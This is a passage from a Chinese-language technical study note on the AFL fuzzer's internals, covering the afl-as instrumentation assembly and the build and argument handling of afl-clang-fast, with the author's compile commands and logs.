%xmm3\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 160(%rsp), %xmm4\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 176(%rsp), %xmm5\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 192(%rsp), %xmm6\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 208(%rsp), %xmm7\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 224(%rsp), %xmm8\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 240(%rsp), %xmm9\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 256(%rsp), %xmm10\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 272(%rsp), %xmm11\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 288(%rsp), %xmm12\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 304(%rsp), %xmm13\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 320(%rsp), %xmm14\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 336(%rsp), %xmm15\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  leaq 352(%rsp), %rsp\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jmp  __afl_store\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>__afl_fork_resume<ul>
<li>表示在子进程中执行。在子进程中，关闭文件描述符 <code>FORKSRV_FD</code> 和 <code>(FORKSRV_FD + 1)</code>，然后进行一系列寄存器的恢复操作，最后跳转到 <code>__afl_store</code> 标签处，继续进行 fuzzing 过程。<ul>
<li>[[#__afl_store]] 代码覆盖记录</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="afl-die退出"><a href="#afl-die退出" class="headerlink" title="__afl_die退出"></a>__afl_die退出</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;__afl_die:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  xorq %rax, %rax\n&quot;</span></span><br><span class="line"><span class="built_in">CALL_L64</span>(<span class="string">&quot;_exit&quot;</span>)</span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="afl-setup-abort配置失败"><a href="#afl-setup-abort配置失败" class="headerlink" title="__afl_setup_abort配置失败"></a>__afl_setup_abort配置失败</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;__afl_setup_abort:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Record setup failure so that we don&#x27;t keep calling\n&quot;</span></span><br><span class="line"><span class="string">&quot;     shmget() / shmat() over and over again. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  incb __afl_setup_failure(%rip)\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %r12, %rsp\n&quot;</span></span><br><span class="line"><span class="string">&quot;  popq %r12\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq  0(%rsp), %rax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq  8(%rsp), %rcx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 16(%rsp), %rdi\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 32(%rsp), %rsi\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 40(%rsp), %r8\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 48(%rsp), %r9\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 56(%rsp), %r10\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 64(%rsp), %r11\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq  96(%rsp), %xmm0\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 112(%rsp), %xmm1\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 128(%rsp), %xmm2\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 144(%rsp), %xmm3\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 160(%rsp), %xmm4\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 176(%rsp), %xmm5\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 192(%rsp), %xmm6\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 208(%rsp), %xmm7\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 224(%rsp), %xmm8\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 240(%rsp), %xmm9\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 256(%rsp), %xmm10\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 272(%rsp), %xmm11\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 288(%rsp), %xmm12\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 304(%rsp), %xmm13\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 320(%rsp), %xmm14\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 336(%rsp), %xmm15\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  leaq 352(%rsp), %rsp\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jmp __afl_return\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;.AFL_VARS:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="变量申请"><a href="#变量申请" class="headerlink" title="变量申请"></a>变量申请</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;  .comm   __afl_area_ptr, 8\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> COVERAGE_ONLY</span></span><br><span class="line">  <span class="string">&quot;  .comm   __afl_prev_loc, 8\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !COVERAGE_ONLY */</span></span></span><br><span class="line">  <span class="string">&quot;  .comm   __afl_fork_pid, 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  .comm   __afl_temp, 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  .comm   __afl_setup_failure, 1\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;  .lcomm   __afl_area_ptr, 8\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> COVERAGE_ONLY</span></span><br><span class="line">  <span class="string">&quot;  .lcomm   __afl_prev_loc, 8\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !COVERAGE_ONLY */</span></span></span><br><span class="line">  <span class="string">&quot;  .lcomm   __afl_fork_pid, 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  .lcomm   __afl_temp, 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  .lcomm   __afl_setup_failure, 1\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;  .comm    __afl_global_area_ptr, 8, 8\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.AFL_SHM_ENV:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  .asciz \&quot;&quot;</span> SHM_ENV_VAR <span class="string">&quot;\&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h3><ul>
<li>函数是程序的主入口，它读取环境变量和命令行参数，然后执行相应的操作，包括调用上述函数来进行插桩处理。</li>
<li>获取环境变量 <code>__AFL_CLANG_MODE</code><ul>
<li>clang_mode</li>
</ul>
</li>
<li>获取环境变量 <code>AFL_QUIET</code> 设置 be_quiet 不打印信息</li>
<li>[[#gettimeofday时间加进程pid构造随机种子]]</li>
<li>[[#edit_params设置参数]]</li>
<li>获取环境变量 <code>AFL_INST_RATIO</code><ul>
<li>inst_ratio_str 可以设置指令比例 比如 AFL_INST_RATIO&#x3D;30 设置 inst_ratio</li>
</ul>
</li>
<li>获取环境变量 <code>__AFL_AS_LOOPCHECK</code><ul>
<li>之后设置他 <code>AS_LOOP_ENV_VAR 1</code></li>
<li>这段代码是为了防止在执行 <code>as</code>（GNU as汇编器）时发生无限循环，以提高程序的稳定性和安全性。</li>
</ul>
</li>
<li>如果设置 <code>AFL_USE_ASAN</code> <code>AFL_USE_MSAN</code><ul>
<li><code>sanitizer = 1;   inst_ratio /= 3;  指令随机变1/3</code></li>
</ul>
</li>
<li>[[#add_instrumentation]]<ul>
<li>插入汇编指令</li>
</ul>
</li>
<li>子进程执行 <code>as -I .. -I . --64 -o /tmp/GHash.o /tmp/.afl-125229-1690800161.s </code></li>
<li>父进程等待子进程执行完毕 <code>if (waitpid(pid, &amp;status, 0) &lt;= 0) PFATAL(&quot;waitpid() failed&quot;);</code></li>
<li>设置环境变量 <code>AFL_KEEP_ASSEMBLY</code> 保存这个 <code>/tmp/.afl-133075-1690873059.s</code><ul>
<li>否则 <code>unlink</code> 删除文件系统中的文件 <code>/tmp/.afl-133075-1690873059.s</code></li>
</ul>
</li>
</ul>
<h2 id="afl-fast-clang"><a href="#afl-fast-clang" class="headerlink" title="afl-fast-clang"></a>afl-fast-clang</h2><ul>
<li>因为AFL对于上述通过<code>afl-gcc</code>来插桩这种做法已经属于不建议，并提供了更好的工具afl-clang-fast，通过llvm pass来插桩。</li>
</ul>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><ul>
<li>[[总结_llvm_clang命令_学习_llvm编译]]</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># use llvm16  error</span></span><br><span class="line"><span class="built_in">export</span> LLVM_CONFIG=<span class="string">&quot;/home/wutang/Desktop/llvm-project-16.0.0.src/install_release/bin/llvm-config&quot;</span></span><br><span class="line"><span class="built_in">export</span> CC=/home/wutang/Desktop/llvm-project-16.0.0.src/install_release/bin/clang-16 CXX=/home/wutang/Desktop/llvm-project-16.0.0.src/install_release/bin/clang-16++</span><br><span class="line"><span class="comment"># /home/wutang/Desktop/llvm-project-16.0.0.src/install_release/bin/llvm-config --ldflags</span></span><br><span class="line"><span class="comment"># /home/wutang/Desktop/llvm-project-16.0.0.src/build/lib</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /home/wutang/Desktop/llvm-project-16.0.0.src/build/bin/llvm-config --cxxflags</span></span><br><span class="line"><span class="built_in">cd</span> /home/wutang/Desktop/google_afl/llvm_mode</span><br><span class="line">make  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># use llvm11</span></span><br><span class="line"><span class="built_in">export</span> LLVM_CONFIG=<span class="string">&quot;llvm-config-11&quot;</span></span><br><span class="line"><span class="built_in">export</span> CC=clang-11 CXX=clang++-11</span><br><span class="line"><span class="comment"># apt install clang-11</span></span><br><span class="line"><span class="comment"># sudo ln -s /usr/bin/clang-11 /usr/bin/clang</span></span><br><span class="line"><span class="comment"># sudo ln -s /usr/bin/clang /usr/bin/clang++</span></span><br><span class="line"><span class="built_in">cd</span> /home/wutang/Desktop/google_afl/llvm_mode</span><br><span class="line">make all  <span class="comment"># AFL_TRACE_PC=1 不指定就用so插装</span></span><br><span class="line"></span><br><span class="line">clang++-11 `llvm-config-11 --cxxflags` -Wl,-znodelete -fno-rtti -fpic -funroll-loops  -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DVERSION=\&quot;2.57b\&quot; -Wno-variadic-macros -shared afl-llvm-pass.so.cc -o ../afl-llvm-pass.so `llvm-config-11 --ldflags`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果启用 AFL_TRACE_PC 就不使用so插装了</span></span><br><span class="line">-DUSE_TRACE_PC=1 </span><br><span class="line"></span><br><span class="line">clang -O3 -funroll-loops -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DAFL_PATH=\&quot;/usr/local/lib/afl\&quot; -DBIN_PATH=\&quot;/usr/local/bin\&quot; -DVERSION=\&quot;2.57b\&quot;  afl-clang-fast.c -o ../afl-clang-fast </span><br><span class="line"><span class="built_in">ln</span> -sf afl-clang-fast ../afl-clang-fast++</span><br><span class="line"></span><br><span class="line">clang++ `llvm-config-11 --cxxflags` -Wl,-znodelete -fno-rtti -fpic -O3 -funroll-loops -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DVERSION=\&quot;2.57b\&quot; -Wno-variadic-macros -shared afl-llvm-pass.so.cc -o ../afl-llvm-pass.so `llvm-config-11 --ldflags`</span><br><span class="line"></span><br><span class="line">clang -O3 -funroll-loops -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DAFL_PATH=\&quot;/usr/local/lib/afl\&quot; -DBIN_PATH=\&quot;/usr/local/bin\&quot; -DVERSION=\&quot;2.57b\&quot;  -fPIC -c afl-llvm-rt.o.c -o ../afl-llvm-rt.o</span><br><span class="line"></span><br><span class="line">[*] Testing the CC wrapper and instrumentation output...</span><br><span class="line"><span class="built_in">unset</span> AFL_USE_ASAN AFL_USE_MSAN AFL_INST_RATIO; AFL_QUIET=1 AFL_PATH=. AFL_CC=clang ../afl-clang-fast -O3 -funroll-loops -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DAFL_PATH=\&quot;/usr/local/lib/afl\&quot; -DBIN_PATH=\&quot;/usr/local/bin\&quot; -DVERSION=\&quot;2.57b\&quot;  ../test-instr.c -o test-instr </span><br><span class="line">argv :</span><br><span class="line">../afl-clang-fast -O3 -funroll-loops -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DAFL_PATH=<span class="string">&quot;/usr/local/lib/afl&quot;</span> -DBIN_PATH=<span class="string">&quot;/usr/local/bin&quot;</span> -DVERSION=<span class="string">&quot;2.57b&quot;</span> ../test-instr.c -o test-instr </span><br><span class="line"></span><br><span class="line">cc_params:</span><br><span class="line">clang -Xclang -load -Xclang ../afl-llvm-pass.so -Qunused-arguments -O3 -funroll-loops -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DAFL_PATH=<span class="string">&quot;/usr/local/lib/afl&quot;</span> -DBIN_PATH=<span class="string">&quot;/usr/local/bin&quot;</span> -DVERSION=<span class="string">&quot;2.57b&quot;</span> ../test-instr.c -o test-instr -g -O3 -funroll-loops -D__AFL_HAVE_MANUAL_CONTROL=1 -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 -D__AFL_LOOP(_A)=(&#123; static volatile char *_B __attribute__((used));  _B = (char*)<span class="string">&quot;##SIG_AFL_PERSISTENT##&quot;</span>; __attribute__((visibility(&quot;default&quot;))) int _L(unsigned int) __asm__(<span class="string">&quot;__afl_persistent_loop&quot;</span>); _L(_A); &#125;) -D__AFL_INIT()=<span class="keyword">do</span> &#123; static volatile char *_A __attribute__((used));  _A = (char*)<span class="string">&quot;##SIG_AFL_DEFER_FORKSRV##&quot;</span>; __attribute__((visibility(&quot;default&quot;))) void _I(void) __asm__(<span class="string">&quot;__afl_manual_init&quot;</span>); _I(); &#125; <span class="keyword">while</span> (0) ../afl-llvm-rt.o </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] afl llvm pass runOnModule tragger</span><br><span class="line">afl-llvm-pass 2.57b by &lt;lszekeres@google.com&gt;</span><br><span class="line">[+] Instrumented 6 locations (non-hardened mode, ratio 100%).</span><br><span class="line">[+] afl llvm pass runOnModule over</span><br><span class="line"></span><br><span class="line">../afl-showmap -m none -q -o .test-instr0 ./test-instr &lt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> 1 | ../afl-showmap -m none -q -o .test-instr1 ./test-instr</span><br><span class="line">[+] All right, the instrumentation seems to be working!</span><br><span class="line">[+] All <span class="keyword">done</span>! You can now use <span class="string">&#x27;../afl-clang-fast&#x27;</span> to compile programs.</span><br></pre></td></tr></table></figure>

<h3 id="测试命令"><a href="#测试命令" class="headerlink" title="测试命令"></a>测试命令</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">cd /home/wutang/Desktop/google_afl</span><br><span class="line">unset AFL_USE_ASAN AFL_USE_MSAN AFL_INST_RATIO; </span><br><span class="line"><span class="keyword">export</span> AFL_PATH=. AFL_CC=clang </span><br><span class="line"># AFL_QUIET=<span class="number">1</span> </span><br><span class="line">build_debug/afl-clang-fast -O3 -funroll-loops -Wall -D_FORTIFY_SOURCE=<span class="number">2</span> -g -Wno-pointer-sign -DAFL_PATH=\<span class="string">&quot;/usr/local/lib/afl\&quot; -DBIN_PATH=\&quot;/usr/local/bin\&quot; -DVERSION=\&quot;2.57b\&quot; test-instr.c -o test-instr </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;</span></span><br><span class="line"><span class="string">build_debug/afl-clang-fast -O3 -funroll-loops -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DAFL_PATH=&quot;</span>/usr/local/lib/afl<span class="string">&quot; -DBIN_PATH=&quot;</span>/usr/local/bin<span class="string">&quot; -DVERSION=&quot;</span><span class="number">2.57b</span><span class="string">&quot; test-instr.c -o test-instr </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">clang -Xclang -load -Xclang ./afl-llvm-pass.so -Qunused-arguments -O3 -funroll-loops -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DAFL_PATH=&quot;</span>/usr/local/lib/afl<span class="string">&quot; -DBIN_PATH=&quot;</span>/usr/local/bin<span class="string">&quot; -DVERSION=&quot;</span><span class="number">2.57b</span><span class="string">&quot; test-instr.c -o test-instr -g -O3 -funroll-loops -D__AFL_HAVE_MANUAL_CONTROL=1 -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 -D__AFL_LOOP(_A)=(&#123; static volatile char *_B __attribute__((used));  _B = (char*)&quot;</span>##SIG_AFL_PERSISTENT##<span class="string">&quot;; __attribute__((visibility(&quot;</span><span class="keyword">default</span><span class="string">&quot;))) int _L(unsigned int) __asm__(&quot;</span>__afl_persistent_loop<span class="string">&quot;); _L(_A); &#125;) -D__AFL_INIT()=do &#123; static volatile char *_A __attribute__((used));  _A = (char*)&quot;</span>##SIG_AFL_DEFER_FORKSRV##<span class="string">&quot;; __attribute__((visibility(&quot;</span><span class="keyword">default</span><span class="string">&quot;))) void _I(void) __asm__(&quot;</span>__afl_manual_init<span class="string">&quot;); _I(); &#125; while (0) ./afl-llvm-rt.o </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">clang -Xclang -load -Xclang /home/wutang/Desktop/google_afl/afl-llvm-pass.so -Qunused-arguments -O3 -funroll-loops -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DAFL_PATH=\&quot;/usr/local/lib/afl\&quot; -DBIN_PATH=\&quot;/usr/local/bin\&quot; -DVERSION=\&quot;2.57b\&quot; test-instr.c -o test-instr -g -O3 -funroll-loops -D__AFL_HAVE_MANUAL_CONTROL=1 -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 -D&quot;</span>__AFL_LOOP\(_A\)<span class="string">&quot;=&quot;</span>\(\&#123; <span class="type">static</span> <span class="keyword">volatile</span> <span class="type">char</span> *_B __attribute__\(\(used\)\);  _B = \(<span class="type">char</span>*\)\<span class="string">&quot;##SIG_AFL_PERSISTENT##\&quot;; __attribute__\(\(visibility\(\&quot;default\&quot;\)\)\) int _L\(unsigned int\) __asm__\(\&quot;__afl_persistent_loop\&quot;\); _L\(_A\); \&#125;\)&quot;</span> -D<span class="string">&quot;__AFL_INIT\(\)&quot;</span>=<span class="string">&quot;do \&#123; static volatile char *_A __attribute__\(\(used\)\);  _A = \(char*\)\&quot;##SIG_AFL_DEFER_FORKSRV##\&quot;; __attribute__\(\(visibility\(\&quot;default\&quot;\)\)\) void _I\(void\) __asm__\(\&quot;__afl_manual_init\&quot;\); _I\(\); \&#125; while \(0\)&quot;</span> /home/wutang/Desktop/google_afl/afl-llvm-rt.o</span><br></pre></td></tr></table></figure>

<h3 id="find-obj"><a href="#find-obj" class="headerlink" title="find_obj"></a>find_obj</h3><ul>
<li>该函数用于查找 AFL 的运行时库文件<code>afl-llvm-rt.o</code> 路径。它首先尝试从环境变量 <code>AFL_PATH</code> 中获取路径，然后尝试从可执行文件的路径中获取路径，最后尝试使用默认路径 <code>AFL_PATH</code> 来查找运行时库文件。</li>
<li>获取环境变量 <code>AFL_PATH</code> 寻找<code>afl-llvm-rt.o</code>文件存储路径到 obj_path</li>
<li>若没有<code>AFL_PATH</code> 找 <code>argv[0]</code> 寻找<code>afl-llvm-rt.o</code>文件存储路径到 obj_path</li>
</ul>
<h3 id="edit-params-1"><a href="#edit-params-1" class="headerlink" title="edit_params"></a>edit_params</h3><ul>
<li>该函数用于编辑编译器参数，将必要的参数添加到 <code>cc_params</code> 数组中。它会根据参数、环境变量和其他设置来添加编译器参数，如 ASAN（AddressSanitizer）和 MSAN（MemorySanitizer）的参数、优化参数、路径等。</li>
<li><code>argv[0]</code> 判断<ul>
<li>如果是<code>afl-clang-fast++</code>  获取环境变量 <code>AFL_CXX</code></li>
<li>否则获取环境变量 <code>AFL_CC</code></li>
</ul>
</li>
<li>如果编译时设置了 <code>USE_TRACE_PC</code>  两种方式<ul>
<li>USE_TRACE_PC 添加参数 <code>-fsanitize-coverage=trace-pc-guard</code><ul>
<li>此时非android 指定 <code>-mllvm -sanitizer-coverage-block-threshold=0</code><ul>
<li>LLVM replaced “-sanitizer-coverage-block-threshold” with “<code>--sanitizer-coverage-level</code>“ in certain commit (probably in LLVM 5.0) and make it default to 0.</li>
</ul>
</li>
</ul>
</li>
<li>非USE_TRACE_PC  否则使用 添加llvm 加载pass参数的方式<ul>
<li><code>-Xclang -load -Xclang /home/wutang/Desktop/google_afl/afl-llvm-pass.so</code></li>
</ul>
</li>
</ul>
</li>
<li>接着过滤参数<ul>
<li>设置bit_mode&#x3D;32 如果遇到参数如下<ul>
<li><code>-m32</code></li>
<li><code>armv7a-linux-androideabi</code></li>
</ul>
</li>
<li>设置 bit_mode &#x3D; 64 如果遇到参数如下<ul>
<li><code>-m64</code></li>
</ul>
</li>
<li>设置 x_set&#x3D;1 如果遇到参数如下<ul>
<li><code>-x</code>  后续设置 <code>-x none</code></li>
</ul>
</li>
<li><code>-fsanitize=address</code>or  <code>-fsanitize=memory</code><ul>
<li>设置 asan_set &#x3D; 1</li>
</ul>
</li>
<li><code>FORTIFY_SOURCE</code><ul>
<li>设置 fortify_set &#x3D; 1</li>
</ul>
</li>
<li>continue 如果遇到参数如下<ul>
<li><code>-Wl,-z,defs</code></li>
<li>或者 <code>-Wl,--no-undefined</code></li>
</ul>
</li>
</ul>
</li>
<li>获取环境变量 <code>AFL_HARDEN</code><ul>
<li><code>-fstack-protector-all</code></li>
<li>如果没设置了 fortify_set  设置 <code>-D_FORTIFY_SOURCE=2</code></li>
</ul>
</li>
<li>asan和 msan 和 AFL_HARDEN 不能同时指定<ul>
<li>获取环境变量 <code>AFL_USE_ASAN</code><ul>
<li>设置 <code>-U_FORTIFY_SOURCE</code> <code>-fsanitize=address</code></li>
</ul>
</li>
<li>获取环境变量 <code>AFL_USE_MSAN</code><ul>
<li>设置 <code>-U_FORTIFY_SOURCE</code> <code>-fsanitize=memory</code></li>
</ul>
</li>
</ul>
</li>
<li>如果没设置环境变量 <code>AFL_DONT_OPTIMIZE</code><ul>
<li>设置 <code>-g</code>  <code>-O3</code> <code>-funroll-loops</code></li>
</ul>
</li>
<li>如果设置了环境变量 <code>AFL_NO_BUILTIN</code><ul>
<li>“-fno-builtin-strcmp”, “-fno-builtin-strncmp”, “-fno-builtin-strcasecmp”, “-fno-builtin-strncasecmp”, “-fno-builtin-memcmp” 比afl-gcc少了两个</li>
</ul>
</li>
<li>设置参数 <code>-D__AFL_HAVE_MANUAL_CONTROL=1 -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</code></li>
<li>通过宏添加代码</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">-<span class="built_in">D__AFL_LOOP</span>(_A)=(&#123; <span class="type">static</span> <span class="keyword">volatile</span> <span class="type">char</span> *_B __attribute__((used));  _B = (<span class="type">char</span>*)<span class="string">&quot;##SIG_AFL_PERSISTENT##&quot;</span>; __attribute__((<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>))) <span class="type">int</span> _L(<span class="type">unsigned</span> <span class="type">int</span>) __asm__(<span class="string">&quot;__afl_persistent_loop&quot;</span>); _L(_A); &#125;) -<span class="built_in">D__AFL_INIT</span>()=<span class="keyword">do</span> &#123; <span class="type">static</span> <span class="keyword">volatile</span> <span class="type">char</span> *_A __attribute__((used));  _A = (<span class="type">char</span>*)<span class="string">&quot;##SIG_AFL_DEFER_FORKSRV##&quot;</span>; __attribute__((<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>))) <span class="type">void</span> _I(<span class="type">void</span>) __asm__(<span class="string">&quot;__afl_manual_init&quot;</span>); _I(); &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line">__AFL_LOOP(_A)=(&#123; \</span><br><span class="line">  <span class="type">static</span> <span class="keyword">volatile</span> <span class="type">char</span> *_B __attribute__((used)); \</span><br><span class="line">  _B = (<span class="type">char</span>*)<span class="string">&quot;##SIG_AFL_PERSISTENT##&quot;</span>; \</span><br><span class="line">  __attribute__((<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>))) <span class="type">int</span> _L(<span class="type">unsigned</span> <span class="type">int</span>) \</span><br><span class="line">  __asm__(<span class="string">&quot;__afl_persistent_loop&quot;</span>);  <span class="comment">// 这里是调用afl-llvm-rt.o.c的代码</span></span><br><span class="line">  _L(_A); </span><br><span class="line">&#125;) </span><br><span class="line">__AFL_INIT()=<span class="keyword">do</span> &#123; \</span><br><span class="line">  <span class="type">static</span> <span class="keyword">volatile</span> <span class="type">char</span> *_A __attribute__((used));  \</span><br><span class="line">  _A = (<span class="type">char</span>*)<span class="string">&quot;##SIG_AFL_DEFER_FORKSRV##&quot;</span>; \</span><br><span class="line">  __attribute__((<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>))) <span class="type">void</span> _I(<span class="type">void</span>) \</span><br><span class="line">    __asm__(<span class="string">&quot;__afl_manual_init&quot;</span>);  <span class="comment">// 这里是调用afl-llvm-rt.o.c的代码</span></span><br><span class="line">  _I(); </span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>判断-m32 -m64 架构添加对应架构<code>afl-llvm-rt-XX.o</code><ul>
<li>添加代码到目标下,这里是 <code>/home/wutang/Desktop/google_afl/afl-llvm-rt.o</code></li>
</ul>
</li>
<li>最后添加NULL</li>
</ul>
<h3 id="非USE-TRACE-PC方式-使用llvmpass"><a href="#非USE-TRACE-PC方式-使用llvmpass" class="headerlink" title="非USE_TRACE_PC方式-使用llvmpass"></a>非USE_TRACE_PC方式-使用llvmpass</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">cd /home/wutang/Desktop/google_afl</span><br><span class="line">clang -Xclang -load -Xclang /home/wutang/Desktop/google_afl/afl-llvm-pass.so -Qunused-arguments -O3 -funroll-loops -Wall -D_FORTIFY_SOURCE=<span class="number">2</span> -g -Wno-pointer-sign -DAFL_PATH=\<span class="string">&quot;/usr/local/lib/afl\&quot; -DBIN_PATH=\&quot;/usr/local/bin\&quot; -DVERSION=\&quot;2.57b\&quot; test-instr.c -o test-instr -g -O3 -funroll-loops -D__AFL_HAVE_MANUAL_CONTROL=1 -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 -D&quot;</span>__AFL_LOOP\(_A\)<span class="string">&quot;=&quot;</span>\(\&#123; <span class="type">static</span> <span class="keyword">volatile</span> <span class="type">char</span> *_B __attribute__\(\(used\)\);  _B = \(<span class="type">char</span>*\)\<span class="string">&quot;##SIG_AFL_PERSISTENT##\&quot;; __attribute__\(\(visibility\(\&quot;default\&quot;\)\)\) int _L\(unsigned int\) __asm__\(\&quot;__afl_persistent_loop\&quot;\); _L\(_A\); \&#125;\)&quot;</span> -D<span class="string">&quot;__AFL_INIT\(\)&quot;</span>=<span class="string">&quot;do \&#123; static volatile char *_A __attribute__\(\(used\)\);  _A = \(char*\)\&quot;##SIG_AFL_DEFER_FORKSRV##\&quot;; 